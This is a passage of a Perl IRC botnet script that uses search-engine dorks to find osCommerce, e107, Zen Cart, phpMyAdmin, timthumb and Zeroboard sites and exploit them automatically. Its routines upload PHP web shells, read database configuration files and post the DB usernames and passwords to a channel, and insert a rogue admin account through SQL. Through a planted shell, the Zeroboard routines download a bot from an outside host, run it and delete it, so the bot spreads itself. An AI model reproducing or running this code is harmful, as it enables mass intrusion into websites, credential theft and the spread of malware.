	&msg("$admin","$oscologo(4@3$engine15)15(4@3SHeLL15)13 http://".$site."images/4picture.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	&msg("$chan","|$oscologo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|"); sleep(2);
	}
}

sub osco3() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);

    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
#            if ($count == $num-1) { &msg("$chan","|$$oscologo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/file_manager.php/login.php";
            my $test2 = "http://".$site."admin/categories.php/login.php";
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_BANNERS/) {
#                 &msg("$chan","|$oscologo(0+4$engine15)15(0+8System15)7 ".$test."|");
				&osco_xpl3($test,$chan,$site,$engine);
				&osco_xpl2($test1,$chan,$site,$engine);
				&osco_xpl($test2,$chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}
sub osco_xpl3() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=insert";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['banners_image' => ['./linux.jpg' => 'picture.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['banners_image' => ['./centos.jpg' => 'picture.inc.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['banners_image' => ['./input.jpg' => 'input.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['banners_image' => ['./output.jpg' => 'output.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd = $browser->post( $url,['banners_image' => ['./mysql.jpg' => 'mysql_dumper.php' => 'application/octet-stream']],'Content-Type' => 'form-data');		
	my $hasil  = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $hasil3 = $resc->as_string;
	my $hasil4 = $resd->as_string;
	my $check = &get_content("http://".$site."images/picture.php");&get_content("http://".$site."images/input.php");&get_content("http://".$site."images/output.php");&get_content("http://".$site."images/mysql_dumper.php");sleep(3);
	if ($check =~ /Faldy sHeLL/) { 
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
	&msg("$chan","|$oscologo(0+4$engine15)15(0+8SHeLLx15)13 http://".$site."images/4picture.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
	&msg("$admin","$oscologo(4@3$engine15)15(4@3SHeLLx15)13 http://".$site."images/4picture.inc.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	&msg("$chan","|$oscologo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|"); sleep(2);
	}
}
sub osql() {
    my $chan   = $_[0];
    my $site   = $_[1];
    my $engine = $_[2];
      my $test = "http://".$site."admin/file_manager.php/login.php?action=download&filename=/includes/configure.php";
      my $re   = &get_content($test);
         if ($re =~ /http:\/\//){
            &osql_xpl($test,$chan,$site);
        }
 }

sub osql_xpl() {
     my $url    = $_[0];
     my $chan   = $_[1];
     my $site   = $_[2];
     my $request   = HTTP::Request->new(GET=>$url);
     my $browser   = LWP::UserAgent->new();
        $browser->timeout(10);
        my $response  = $browser->request($request);
         if ($response->is_success) {
 	 my $res   = $response->as_string;
	if ($res =~ m/'DIR_FS_CATALOG', '(.*)'/g) {
	&msg("$chan","|$ossqllogo(0+8VULN)15 http://".$site." 14[+]DIR path: 4 $1 |");
	&msg("$admin","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DIR path: 4 $1");
	}
	if ($res =~ m/'DB_SERVER', '(.*)'/g) {
	&msg("$chan","|$ossqllogo(0+8VULN)15 http://".$site." 14[+]DB Server: 4 $1 |");
	&msg("$admin","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB Server: 4 $1");
	}
	if ($res =~ m/'DB_SERVER_USERNAME', '(.*)'/g) {
	&msg("$chan","|$ossqllogo(0+8VULN)15 http://".$site." 14[+]DB username: 4 $1 |");
	&msg("$admin","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB username: 4 $1");
	}
	if ($res =~ m/'DB_SERVER_PASSWORD', '(.*)'/g) {
	&msg("$chan","|$ossqllogo(0+8VULN)15 http://".$site." 14[+]DB password: 4 $1 |");
	&msg("$admin","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB password: 4 $1");
	}
	if ($res =~ m/'DB_DATABASE', '(.*)'/g) {
	&msg("$chan","|$ossqllogo(0+8VULN)15 http://".$site." 14[+]DB database: 4 $1 |");
	&msg("$admin","$ossqllogo(4@3VULN)15 http://".$site." 14[+]DB database: 4 $1");
		}
	}
}

sub oscoQ() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$ossqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$ossqllogo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site."admin/file_manager.php/login.php?action=download&filename=/includes/configure.php";
            my $re   = &get_content($test);
            if ($re =~ /http:\/\//){
            &osql_xpl($test,$chan,$site);
            }
         }
    }
}

sub e107xpl1() {
    my $chan   = $_[0];
    my $site   = $_[1];
    my $engine = $_[2];
      my $test = "http://".$site."e107_plugins/my_gallery/image.php?file=../../e107_config.php";
      my $re   = &get_content($test);
         if ($re =~ /http:\/\//){
            &osql_xpl($test,$chan,$site);
        }
 }

sub e107xpl() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logosql);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$e107logosql(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site."e107_plugins/my_gallery/image.php?file=../../e107_config.php";
            my $re   = &get_content($test);
            if ($re =~ /http:\/\//){
#                 &msg("$chan","|$e107logosql(0+4$engine15)15(0+8System15)7 ".$test."|");
            &e107_cuk($test,$chan,$site);
            }
         }
    }
}
sub e107_cuk() {
     my $url    = $_[0];
     my $chan   = $_[1];
     my $site   = $_[2];
     my $request   = HTTP::Request->new(GET=>$url);
     my $browser   = LWP::UserAgent->new();
        $browser->timeout(10);
        my $response  = $browser->request($request);
         if ($response->is_success) {
 	 my $res   = $response->as_string;
	if ($res =~ m/mySQLserver    = '(.*)'/g) {
	&msg("$chan","|$e107logosql (0+8VULN)15 http://".$site." 14[+]DB Server: 4 $1 |");
	}
	if ($res =~ m/mySQLuser      = '(.*)'/g) {
	&msg("$chan","|$e107logosql (0+8VULN)15 http://".$site." 14[+]DB username: 4 $1 |");
	}
	if ($res =~ m/mySQLpassword  = '(.*)'/g) {
	&msg("$chan","|$e107logosql (0+8VULN)15 http://".$site." 14[+]DB password: 4 $1 |");
	}
	if ($res =~ m/mySQLdefaultdb = '(.*)'/g) {
	&msg("$chan","|$e107logosql (0+8VULN)15 http://".$site." 14[+]DB database: 4 $1 |");
		}
	}
}
sub adm() {
    my $chan = $_[0];

    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$admlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$admlogo(0+4$engine15)10 Scan finish|"); }
            my $test  = "http://".$site."phpMyAdmin/config/config.inc.php?c=id";
            my $vuln = "http://".$site."phpMyAdmin/config/config.inc.php?c=";
            my $re   = &get_content($test);
            if ($re =~ /$adm_output/){
            &msg("$chan", "|$admlogo(0+4$engine15)(0+8VulN15)13 ".$vuln."15(0+0OKE15)|");
            }
         }
    }
}

sub op() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oplogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$oplogo(0+4$engine15)10 Scan finish|"); }
            my $test  = "http://".$site.$open_test;
            my $vuln = "http://".$site."admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html";
            my $re   = &get_content($test);
            if ($re =~ /$open_output/){
            &msg("$chan", "|$oplogo(0+4$engine15)(0+8VulN15)13 ".$vuln."15(4@0UPLOAD15)|");
            }
         }
    }
}

sub zen() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$zenlogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$zenlogo(0+4$engine15)10 Scan finish|"); }
            my $test  = "http://".$site."admin/sqlpatch.php/password_forgotten.php?action=execute";
            my $html  = &get_content($test);
               if ($html =~ /zc_install/){
                   &zen_query($chan,$site,$test);
                   }
               }
          }
     }
sub zen_query() {
    my $chan = $_[0];
    my $url = $_[1];
    my $test = $_[2];
    my $code  = "INSERT+INTO+admin+%28admin_id%2C+admin_name%2C+admin_email%2C+admin_pass%29+VALUES+%28621%2C+%27gcyber%27%2C+%27susudada16%40gmail.com%27%2C+%274d5254218ec0c9edd5d05ce549399c53%3Abe%27%29%3B";
    my $req = HTTP::Request->new(POST => $test);
    $req->content_type("application/x-www-form-urlencoded");
    $req->content("query_string=".$code);
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(3);
    my $res = $ua->request($req);
    my $data = $res->as_string;
   if ( $data =~ /1 statements processed/i ) {
   &msg("$chan","|$zenlogo(0+8VulN15)8 http://".$url."4admin/login.php 15(0+9user15)0 gcyber 15(0+9pass15)0 admin|");
   &msg("$admin","$zenlogo(4@9VulN15)8 http://".$url."4admin/login.php 15(4@9user15)0 gcyber 15(4@9pass15)0 admin");
   }
   elsif ( $data =~ /Duplicate entry/ ) { 
   &msg("$chan","|$zenlogo(0+8SuCcEs15)12 http://".$url."3admin/login.php 15(0+9user15)10 gcyber 15(0+9pass15)10 admin|");
   &msg("$admin","|$zenlogo(0+8SuCcEs15)12 http://".$url."3admin/login.php 15(0+9user15)10 gcyber 15(0+9pass15)10 admin");
   }
}
sub thumb() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$thumblogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
				if ($count == $num-1) { &msg("$chan","|$thumblogo(14$engine15)3 S14can finish|"); }
			my $vuln = "http://".$site.$bug."thumb.php?src=http://picasa.com.moveissantafe.com/yahoo.php";
                        #my $botshell  = "http://www.envioneer.com/board//data/notice/1194741991/byroe.jpg";
                        #my $botshell2  = "http://www.envioneer.com/board//data/notice/1194741991/allnet.jpg";
 			my $target1 = "http://".$site.$bug."cache/ffe37f6533095659017bd96829adf796.php";
 			my $target2 = "http://".$site.$bug."cache/external_ffe37f6533095659017bd96829adf796.php";
			my $check = &get_content($vuln);sleep(1);
						&get_content($bot);sleep(1);
 			if ($check =~ /imagecreatefromgif/) {
 			my $vuln1 = &get_content($target1);
 			if ($vuln1 =~ /GIF89a/) {
 			my $safe   ="";
			my $os 	   ="";
			my $free   ="";
	        if ($vuln1 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
			if ($vuln1 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
			if ($vuln1 =~ m/OS : (.*?)<br>/) {$os = $1;}
			if ($vuln1 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
 	        &msg("$chan","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
 			&msg("$admin","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
 			}
 			my $vuln2 = &get_content($target2);
 			if ($vuln2 =~ /GIF89a/) {
 			my $safe   ="";
			my $os 	   ="";
			my $free   ="";
	        if ($vuln2 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
			if ($vuln2 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
			if ($vuln2 =~ m/OS : (.*?)<br>/) {$os = $1;}
			if ($vuln2 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
 	        &msg("$chan","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/external_ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
			&msg("$admin","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/external_ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
		    }
 		}
    }
}
}
sub thumb2() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$thumblogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
				if ($count == $num-1) { &msg("$chan","|$thumblogo(14$engine15)3 S14can finish|"); }
			my $vuln = "http://".$site.$bug."timthumb.php?src=http://picasa.com.moveissantafe.com/yahoo.php";
                        #my $botshell  = "http://www.envioneer.com/board//data/notice/1194741991/allnet.jpg";
                        #my $botshell2  = "http://www.envioneer.com/board//data/notice/1194741991/I-T.jpg";
 			my $target1 = "http://".$site.$bug."cache/ffe37f6533095659017bd96829adf796.php";
 			my $target2 = "http://".$site.$bug."cache/external_ffe37f6533095659017bd96829adf796.php";
			my $check = &get_content($vuln);sleep(1);
						&get_content($bot);sleep(1);
 			if ($check =~ /imagecreatefromgif/) {
 			my $vuln1 = &get_content($target1);
 			if ($vuln1 =~ /GIF89a/) {
 			my $safe   ="";
			my $os 	   ="";
			my $free   ="";
	        if ($vuln1 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
			if ($vuln1 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
			if ($vuln1 =~ m/OS : (.*?)<br>/) {$os = $1;}
			if ($vuln1 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
 	        &msg("$chan","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
 			&msg("$admin","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
 			}
 			my $vuln2 = &get_content($target2);
 			if ($vuln2 =~ /GIF89a/) {
 			my $safe   ="";
			my $os 	   ="";
			my $free   ="";
	        if ($vuln2 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
			if ($vuln2 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
			if ($vuln2 =~ m/OS : (.*?)<br>/) {$os = $1;}
			if ($vuln2 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
 	        &msg("$chan","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/external_ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
			&msg("$admin","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/external_ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
		    }
 		}
    }
}
}
sub thumb3() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$thumblogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
				if ($count == $num-1) { &msg("$chan","|$thumblogo(14$engine15)3 S14can finish|"); }
			my $vuln = "http://".$site.$bug."timthumb.php?src=http://picasa.com.moveissantafe.com/yahoo.php";
                        #my $botshell  = "http://www.envioneer.com/board//data/notice/1194741991/allnet.jpg";
                        #my $botshell2  = "http://www.envioneer.com/board//data/notice/1194741991/I-T.jpg";
 			my $target1 = "http://".$site.$bug."cache/ffe37f6533095659017bd96829adf796.php";
 			my $target2 = "http://".$site.$bug."cache/external_ffe37f6533095659017bd96829adf796.php";
			my $check = &get_content($vuln);sleep(1);
						&get_content($bot);sleep(1);
 			if ($check =~ /imagecreatefromgif/) {
 			my $vuln1 = &get_content($target1);
 			if ($vuln1 =~ /GIF89a/) {
 			my $safe   ="";
			my $os 	   ="";
			my $free   ="";
	        if ($vuln1 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
			if ($vuln1 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
			if ($vuln1 =~ m/OS : (.*?)<br>/) {$os = $1;}
			if ($vuln1 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
 	        &msg("$chan","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
 			&msg("$admin","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
 			}
 			my $vuln2 = &get_content($target2);
 			if ($vuln2 =~ /GIF89a/) {
 			my $safe   ="";
			my $os 	   ="";
			my $free   ="";
	        if ($vuln2 =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
			if ($vuln2 =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
			if ($vuln2 =~ m/OS : (.*?)<br>/) {$os = $1;}
			if ($vuln2 =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
 	        &msg("$chan","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/external_ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
			&msg("$admin","|$thumblogo(0+4$engine15)15(0+8SHeLL15)13 http://".$site.$bug."4cache/external_ffe37f6533095659017bd96829adf796.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
		    }
 		}
    }
}
}
sub zero() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$zerologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$zerologo 15(14$engine15)4 Scan finish|"); }
			my $reslx = "http://".$site.$bug;
 			my $crot = get_content($reslx);
 			if ($crot =~ /Zeroboard/) {
 			my $sc = system("./zero $reslx 80");
 			my $laporan = get_content("http://".$site."/data/shell.php?cmd=uname%20-a");
			my $spread = get_content("http://".$site."/data/shell.php?cmd=lwp-download%20http://www.envioneer.com/board//data/notice/1194741991/bot.txt;perl%20bot.txt;rm%20-fr%20bot.txt"); 
 			my $check = get_content("http://".$site."/data/shell.php");
 				if ($check =~ /Cannot execute a blank command/) {
                &msg("$chan","|$zerologo 15(14$engine15)(4SHeLL15)14 http://".$site."4/data/shell.php 3Uname: $laporan|");
 				&msg("$admin","|$zerologo 15(14$engine15)(4SHeLL15)14 http://".$site."3/data/shell.php 3Uname: $laporan|");				   
                }
 			}
        }
    }
}
sub zero2() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$zerologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$zerologo 15(14$engine15)4 Scan finish|"); }
			my $reslx = "http://".$site.$bug;
 			my $crot = get_content($reslx);
 			if ($crot =~ /Zeroboard/) {
 			my $sc = system("./zero $reslx 80");
 			my $laporan = get_content("http://".$site."/data/.php?cmd=uname%20-a");
			my $spread = get_content("http://".$site."/data/.php?cmd=lwp-download%20http://www.envioneer.com/board//data/notice/1194741991/bot.txt;perl%20bot.txt;rm%20-fr%20bot.txt"); 
 			my $check = get_content("http://".$site."/data/shell.php");
 				if ($check =~ /Cannot execute a blank command/) {
                &msg("$chan","|$zerologo 15(14$engine15)(4SHeLL15)14 http://".$site."4/data/.php 8Uname: $laporan|");
 				&msg("$admin","|$zerologo 15(14$engine15)(4SHeLL15)14 http://".$site."3/data/.php 3Uname: $laporan|");				   
                }
 			}
        }
    }
}
#########################################

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "ReDiff") { my @rediff = &rediff($dork); push(@total,@rediff); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "ALtaViSTa") { my @altavista = &altavista($dork); push(@total,@altavista); }
    if ($engine eq "YahOo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }
    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
    if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }
    if ($engine eq "GutSer") { my @gutser = &gutser($dork); push(@total,@gutser); }
    if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }
    if ($engine eq "ExaLead") { my @exalead = &exalead($dork); push(@total,@exalead); }
    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }
    if ($engine eq "VirgiLio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }
    if ($engine eq "WebDe") { my @webde = &webde($dork); push(@total,@webde); }
    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }
    if ($engine eq "DuCk") { my @duck = &duck($dork); push(@total,@duck); }
    if ($engine eq "LyGo") { my @lygo = &lygo($dork); push(@total,@lygo); }
    if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }
    if ($engine eq "BaiDu") { my @baidu = &baidu($dork); push(@total,@baidu); }
    if ($engine eq "KiPoT") { my @kipot = &kipot($dork); push(@total,@kipot); }
    if ($engine eq "GiBLa") { my @gibla = &gibla($dork); push(@total,@gibla); }
    if ($engine eq "BLacK") { my @black = &black($dork); push(@total,@black); }
    if ($engine eq "oNeT") { my @onet = &onet($dork); push(@total,@onet); }
    if ($engine eq "SiZuka") { my @sizuka = &sizuka($dork); push(@total,@sizuka); }
    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
    if ($engine eq "DeMos") { my @demos = &demos($dork); push(@total,@demos); }
    if ($engine eq "RoSe") { my @rose = &rose($dork); push(@total,@rose); }
    if ($engine eq "SeZnaM") { my @seznam = &seznam($dork); push(@total,@seznam); }
    if ($engine eq "TisCali") { my @tiscali = &tiscali($dork); push(@total,@tiscali); }
    if ($engine eq "NaVeR") { my @naver = &naver($dork); push(@total,@naver); }
    if ($engine eq "live") { my @live = &live($dork); push(@total,@live); }
    if ($engine eq "rakuten") { my @rakuten = &rakuten($dork); push(@total,@rakuten); }
    if ($engine eq "biglobe") { my @biglobe = &biglobe($dork); push(@total,@biglobe); }
    if ($engine eq "nova") { my @nova = &nova($dork); push(@total,@nova); }
    if ($engine eq "nadji") { my @nadji = &nadji($dork); push(@total,@nadji); }
    if ($engine eq "goo") { my @goo = &goo($dork); push(@total,@goo); }
    if ($engine eq "uksubmit") { my @uksubmit = &uksubmit($dork); push(@total,@uksubmit); }
    if ($engine eq "excite") { my @excite = &excite($dork); push(@total,@excite); }
    if ($engine eq "amidalla") { my @amidalla = &amidalla($dork); push(@total,@amidalla); }
    if ($engine eq "buscar") { my @buscar = &buscar($dork); push(@total,@buscar); }
    if ($engine eq "sogou") { my @sogou = &sogou($dork); push(@total,@sogou); }
    if ($engine eq "interia") { my @interia = &interia($dork); push(@total,@interia); }
    if ($engine eq "snz") { my @snz = &snz($dork); push(@total,@snz); }
    if ($engine eq "yandex") { my @yandex = &yandex($dork); push(@total,@yandex); }
    if ($engine eq "joeant") { my @joeant = &joeant($dork); push(@total,@joeant); }
    if ($engine eq "terra") { my @terra = &terra($dork); push(@total,@terra); }
    if ($engine eq "youdao") { my @youdao = &youdao($dork); push(@total,@youdao); }
    if ($engine eq "amfibi") { my @amfibi = &amfibi($dork); push(@total,@amfibi); }
    if ($engine eq "bigclique") { my @bigclique = &bigclique($dork); push(@total,@bigclique); }
    if ($engine eq "dancefloor") { my @dancefloor = &dancefloor($dork); push(@total,@dancefloor); }
    @clean = &clean(@total);
    &msg("$chan","$logo(4@3$engine15)4 Total:15 (".scalar(@total).")4 Clean:15 (".scalar(@clean).")");
    return @clean;
}

#########################################

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

######################################### SEARCH ENGINE gibla

sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=400; $i+=10){
        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /google/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rediff() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=500; $i+=10) {
        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);
		$b = "$i";
        my $res = &search_engine_query($search);
		if ($res !~ /firstres=$b\'>/) {$i=500;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {
            if ($1 !~ /rediff\.com/){
            my $link = $1;
				my @grep = &links($link);
				push(@list,@grep);
			}
        }
    }
    return @list;
}

sub uol() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);
        my $res = &search_engine_query($search);
		if ($res !~ m/<span class=\"next\">pr?xima<\/span>/){$i=500;}
        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
            if ($1 !~ /uol\.com/) {
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$i."&FORM=PERE");
        my $res = &search_engine_query($search);
		if ($res =~ m/Ref A:/g && $res =~ m/Ref B:/g && $res =~ m/Ref C:/g) {$i=500;}
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /bing\.com/) {
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub altavista() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=500; $i+=10){
        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".&key($key)."&stq=".$i);
        my $res = &search_engine_query($search);
		if ($res !~ /target=\"_self\">Succ/) {$i=500;}
        while ($res =~ m/<span class=ngrn>(.+?)\//g) {
